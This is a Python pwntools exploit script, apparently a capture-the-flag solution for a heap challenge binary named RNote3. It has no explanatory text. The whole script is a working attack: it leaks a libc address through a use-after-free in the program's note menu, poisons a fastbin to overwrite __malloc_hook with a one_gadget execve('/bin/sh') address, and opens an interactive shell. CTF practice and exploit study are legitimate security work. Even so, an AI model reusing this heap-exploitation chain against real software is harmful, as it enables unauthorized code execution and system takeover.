#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./RNote3"
libcPath = "./libc.so.6"
remoteAddr = "localhost"
remotePort = 9999

context.log_level = "debug"
context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    main_arena = 0x399b00
    one_gadget = 0x3f32a

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)
    main_arena = 0x3c4b20
    '''
    0xf1147	execve("/bin/sh", rsp+0x70, environ)
    constraints:
        [rsp+0x70] == NULL
    '''
    one_gadget = 0xf1147

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def add(title, size, cont):
    info("add {} {:#x} {}".format(title, size, cont))
    io.sendline("1")
    io.sendafter("title: ", title)
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", cont)
    sleep(0.1)

def show(title):
    info("show {}".format(title))
    io.sendline("2")
    io.sendafter("title: ", title)
    sleep(0.1)

def edit(title, cont):
    info("edit {} {}".format(title, cont))
    io.sendline("3")
    io.sendafter("title: ", title)
    io.sendafter("content: ", cont)
    sleep(0.1)

def delete(title):
    info("delete {}".format(title))
    io.sendline("4")
    io.sendafter("title: ", title)
    sleep(0.1)

if __name__ == "__main__":
    add('0\n', 0x80, 'aaaa\n')
    add('1\n', 0x10, 'bbbb\n')
    show('0\n')
    #  DEBUG([0xFD0, 0xE6E], True)
    delete('x\n')
    show('\n')
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - main_arena
    success("libc", libc.address)

    add('2\n', 0x80, 'cccc\n')
    add('3\n', 0x68, 'dddd\n') 
    add('4\n', 0x68, 'eeee\n')
    show('3\n')
    #  DEBUG([0xFE2, 0xE31], True)
    delete('x\n')
    edit('\n', p64(libc.sym['__malloc_hook'] - 0x23) + '\n')
    
    add('5\n', 0x68, 'ffff\n')
    add('6\n', 0x68, 0x13 * '\0' + p64(libc.address + one_gadget) + '\n')
    
    delete('0\n')

    io.interactive()
    io.close()


